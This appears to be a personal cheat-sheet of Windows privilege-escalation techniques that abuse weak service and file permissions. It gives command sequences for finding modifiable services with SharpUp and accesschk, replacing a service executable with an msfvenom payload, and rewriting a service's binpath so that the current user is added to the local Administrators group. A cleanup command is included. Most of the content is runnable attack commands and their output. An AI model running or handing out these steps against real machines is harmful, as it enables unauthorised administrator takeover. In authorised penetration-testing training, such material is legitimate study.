Here you will find a list of most common PE techniques over weak permissions in Windows.

## Weak ACLs
1)Upload **ShapUp.exe** on the Victim Machine: https://github.com/GhostPack/SharpUp/
2)Check for weak ACLs
```
.\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```
3)Check FS permissions
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```
4)Both Usefs and Everyone have F: Full Access this mean we can replace the exe with one RCE from MSFVENOM
```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

### Atlernative Scenario:
1)Check for weak ACLs
```
SharpUp.exe audit 

=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
2)Check for permissions over Service
```
PsService.exe security WindscribeService
or 
accesschk.exe /accepteula -quvcw WindscribeService
```
3)If you find example that Authenticated Users have RW then you can proceed
```
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
		
```
4)Edit the Service to execute a payload ex (Add yourself to Admins)
```
sc config WindscribeService binpath="cmd /c net localgroup Administrators YOURUSER /add"
```
5)Start the Service to invoke the payload(IT's okay if it fails)
6)Check group membership over Administrators
```
net localgroup administrators
```


**OBS:** to revert(CLEANUP): 
```
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```